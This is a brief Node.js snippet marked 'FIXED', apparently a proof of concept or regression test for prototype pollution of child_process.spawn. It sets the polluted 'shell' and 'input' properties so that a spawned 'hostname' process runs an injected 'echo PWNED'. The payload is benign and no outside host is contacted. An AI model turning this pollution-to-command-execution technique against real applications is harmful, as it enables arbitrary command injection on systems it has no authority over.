// FIXED !!

const { spawn } = require('child_process');

Object.prototype.shell = 'cmd.exe.';
Object.prototype.input = 'echo PWNED\n';

const spawnedProcess = spawn('hostname', {});

spawnedProcess.stdout.on('data', (data) => {
  console.log(`Output: ${data}`);
});

spawnedProcess.stderr.on('data', (data) => {
  console.error(`Error: ${data}`);
});

spawnedProcess.on('close', (code) => {
  console.log(`Process exited with code ${code}`);
});

spawnedProcess.on('error', (err) => {
  console.error(`Spawned process error: ${err}`);
});